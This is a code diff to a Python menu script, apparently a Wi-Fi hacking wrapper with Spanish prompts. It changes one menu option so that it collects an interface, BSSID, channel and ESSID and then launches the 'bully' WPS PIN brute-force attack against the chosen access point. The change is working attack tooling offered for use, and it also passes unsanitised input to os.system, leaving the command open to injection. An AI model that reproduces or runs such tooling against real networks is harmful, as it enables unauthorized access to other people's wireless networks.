@@ -109,9 +109,17 @@ elif WH == 7:
 
 elif WH == 8:
     os.system("clear")
-    os.system("wifite")
-    time.sleep(4)
-    os.system("python3 wifi-hack.py")
+    banner()
+    print(" \033[1;37mIngrese la interfaz: (\033[0;37mwlan\033[0;31m0\033[0;37mmon \033[1;37m| \033[0;37mwlan\033[0;34m1\033[0;37mmon\033[1;37m)\033[0m")
+    interfaz = input(" \033[1;32m>> \033[0;37m")
+    print(" \033[1;37mIngrese el BSSID del AP:")
+    bssid = input(" \033[1;32m>> \033[0;37m")
+    print(" \033[1;37mIngrese el canal del AP:")
+    channel = input(" \033[1;32m>> \033[0;37m")
+    print(" \033[1;37mIngrese el ESSID del AP:")
+    essid = input(" \033[1;32m>> \033[0;37m")
+    comando = "bully {} -b {} -c {} -e {} --force".format(interfaz, bssid, channel, essid)
+    os.system(comando)
 
 elif WH == 9:
     os.system("clear")
